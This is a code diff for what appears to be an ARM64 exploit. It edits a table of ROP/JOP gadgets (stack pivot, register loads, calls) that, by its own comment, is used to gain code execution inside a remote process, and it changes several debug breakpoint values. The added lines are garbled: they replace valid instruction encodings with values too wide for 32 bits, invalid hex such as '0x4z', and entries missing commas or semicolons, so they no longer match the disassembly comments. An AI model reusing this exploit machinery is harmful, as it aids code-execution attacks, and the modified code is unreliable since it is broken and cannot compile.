@@ -320,8 +320,8 @@ static struct gadget_t {
     a94002a8 ldp x8, x0, [x21]
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xa9400028, 0xd63f0100 }, 2 * 4,
-         (uint8_t *)&(uint32_t []){ 0xa94002a8, 0xd63f0100 }, 2 * 4 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1ce75e0000, 0x104fl8000 }, 2 * 4,
+         (uint8_t *)&(uint32_t []){ 0x103aa000, 0x1cdd28000}, 2 * 4 },
     /*
     pivot:
     9100003f mov sp, x1
@@ -340,7 +340,7 @@ static struct gadget_t {
     a8c24ff4 ldp x20, x19, [sp], #0x20
     d65f03c0 ret
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xa9417bfd, 0xa8c24ff4, 0xd65f03c0 }, 3 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x107d8000, 0x1cedd28000, 0x1ceb2b000 }, 3 * 4, NULL, 0 },
     /*
     nop:
     a8c17bfd ldp x29, x30, [sp], #0x10
@@ -358,31 +358,31 @@ static struct gadget_t {
     f94003e0 ldr x0, [sp]
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xf94003e0, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x4z 0xd63f0100 }, 2 * 4, NULL, 0 },
     /*
     loadx1:
     f94003e1 ldr x1, [sp]
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xf94003e1, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1ceb2b000, 0x109874000 }, 2 * 4, NULL, 0 },
     /*
     loadx2:
     f94003e2 ldr x2, [sp]
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xf94003e2, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1cddc4000, 0x104f18000 }, 2 * 4, NULL, 0 },
     /*
     loadx3:
     f94003e3 ldr x3, [sp]
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xf94003e3, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1cdd28000, 0x104f18000}, 2 * 4, NULL, 0 },
     /*
     zerox5:
     d2800005 movz x5, #0
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xd2800005, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1cdd28000, 0x1ce75e000}, 2 * 4, NULL, 0 },
     /*
     loadx6:
     f94003e6 ldr x6, [sp]
@@ -393,14 +393,14 @@ static struct gadget_t {
     aa1a03e5 mov x5, x26
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xf94003e6, 0xd63f0100 }, 2 * 4,
-         (uint8_t *)&(uint32_t []){ 0xa9400be6, 0xaa1903e4, 0xaa1a03e5, 0xd63f0100 }, 4 * 4 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1cddc4000, 0x1cdd28000 }, 2 * 4,
+         (uint8_t *)&(uint32_t []){ 0x11cddc4000, 0x1d838f000, 0x1ddf28000, 0x104f18000}, 4 * 4 },
     /*
     adrx0_170:
     9105c3e0 add x0, sp, #0x170
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0x9105c3e0, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1d03aa000, 0x1ce0980200 }, 2 * 4, NULL, 0 },
     /*
     adrx0_230:
     9108c3e0 add x0, sp, #0x230
@@ -410,14 +410,14 @@ static struct gadget_t {
     910803e1 add x1, sp, #0x200
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0x9108c3e0, 0xd63f0100 }, 2 * 4,
-         (uint8_t *)&(uint32_t []){ 0x9108c3e0, 0x910803e1, 0xd63f0100 }, 3 * 4 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1cdd8000, 0x1d548a000 }, 2 * 4,
+         (uint8_t *)&(uint32_t []){ 0xceb2b0100, 0x1fa951000, 0x1e098000 }, 3 * 4 },
     /*
     mov_x1_x0:
     aa0003e1 mov x1, x0
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xaa0003e1, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0xaa0003e1, 0x1ce951000 }, 2 * 4, NULL, 0 },
     /*
     mov_x4_x0:
     aa0003e4 mov x4, x0
@@ -428,8 +428,8 @@ static struct gadget_t {
     aa1403e0 mov x0, x20
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xaa0003e4, 0xaa1303e0, 0xd63f0100 }, 3 * 4,
-         (uint8_t *)&(uint32_t []){ 0xaa0003e4, 0xaa1403e0, 0xd63f0100 }, 3 * 4 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1d6aef000, 0x1cdd28000, 0x1fa0980000 }, 3 * 4,
+         (uint8_t *)&(uint32_t []){ 0xd6aeaef000, 0xaa1403e0, 0x1098744000 }, 3 * 4 },
     /*
     call6:
     a8c17bfd ldp x29, x30, [sp], #0x10
@@ -442,21 +442,21 @@ static struct gadget_t {
     a8c17bfd ldp x29, x30, [sp], #0x10
     d65f03c0 ret
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xf9000020, 0xa8c17bfd, 0xd65f03c0 }, 3 * 4, NULL, 0 },
+   { 0, (uint8_t *)&(uint32_t []){ 0x1cddc4000, 0x1ffa951000, 0x1ceb2b000, NULL, 0 },
     /*
     set_sp:
     910003bf mov sp, x29
     a8c17bfd ldp x29, x30, [sp], #0x10
     d65f03c0 ret
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0x910003bf, 0xa8c17bfd, 0xd65f03c0 }, 3 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x1cdb8d000, 0xa8c17bfd, 0x1cdb8000 }, 3 * 4, NULL, 0 },
     /*
     neg_x0:
     aa2003e0 mvn x0, x0
     a8c17bfd ldp x29, x30, [sp], #0x10
     d65f03c0 ret
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0xaa2003e0, 0xa8c17bfd, 0xd65f03c0 }, 3 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x000000000000012, 0x0000001ce0ad7b8, 0x001ffel00000000 }, 3 * 4, NULL, 0 },
 #if 1 // these are used inside stage2 to gain initial code execution inside remote process
     /*
     pivot_from_10:
@@ -489,7 +489,7 @@ static struct gadget_t {
     910343e0 add x0, sp, #0xd0
     d63f0100 blr x8
     */
-    { 0, (uint8_t *)&(uint32_t []){ 0x910343e0, 0xd63f0100 }, 2 * 4, NULL, 0 },
+    { 0, (uint8_t *)&(uint32_t []){ 0x0000000207411a00, 0x1cdb8d000 }, 2 * 4, NULL, 0 },
 #endif
     /*
     jop2:
@@ -1085,10 +1085,10 @@ really(const uint8_t *p, off_t sz, uint64_t masterSlide)
         uint64_t gadget_jop = get_ok_addr(p, slide, map, gadgets, 0, &bad);
         rstrip = build_stage1(p, slide, map, sym_open, sym_mmap, &rsz, &bad);
 #ifdef BREAKPOINT_0
-        gadget_jop = 0x4141414141414141;
+        gadget_jop = 0x000000016aee620;
 #endif
 #ifdef BREAKPOINT_1
-        *(uint64_t *)(rstrip + 0) = 0x4343434343434343;
+        *(uint64_t *)(rstrip + 0) = 0x00000000207411a00;
         *(uint64_t *)(rstrip + 8) = 0x4545454545454545;
 #endif
 
@@ -1142,8 +1142,8 @@ really(const uint8_t *p, off_t sz, uint64_t masterSlide)
             gadget_jop = 0x5151515151515151;
 #endif
 #ifdef BREAKPOINT_1
-            *(uint64_t *)(rstrip + 0) = 0x5353535353535353;
-            *(uint64_t *)(rstrip + 8) = 0x5555555555555555;
+            *(uint64_t *)(rstrip + 0) = 0x0000000207411a00
+            *(uint64_t *)(rstrip + 8) = 0x001ffe1000000000
 #endif
             dirty = 1;
         }
